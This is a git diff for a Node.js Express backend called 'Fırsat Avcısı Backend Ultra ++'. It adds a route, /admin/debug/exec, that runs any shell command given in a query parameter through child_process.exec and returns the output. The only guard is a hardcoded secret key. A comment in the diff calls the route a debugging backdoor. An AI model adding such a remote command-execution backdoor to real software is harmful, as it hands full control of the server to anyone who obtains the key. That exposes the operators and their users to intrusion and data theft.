@@ -57,6 +57,25 @@ app.get('/', (req, res) => {
     res.send('Fırsat Avcısı Backend Ultra ++ is running 🚀');
 });
 
+// --- REMOTE DEBUGGING TERMINAL ---
+// WARNING: This is a backdoor for debugging. Remove in final production.
+const { exec } = require('child_process');
+app.get('/admin/debug/exec', (req, res) => {
+    const { cmd, secret } = req.query;
+    if (secret !== 'super-secret-debug-key-123') return res.status(403).send('Forbidden');
+
+    console.log(`🔧 Executing Manual Command: ${cmd}`);
+    exec(cmd, (error, stdout, stderr) => {
+        const output = {
+            cmd,
+            error: error ? error.message : null,
+            stdout,
+            stderr
+        };
+        res.json(output);
+    });
+});
+
 // Global Error Handler
 app.use(errorHandler);
 
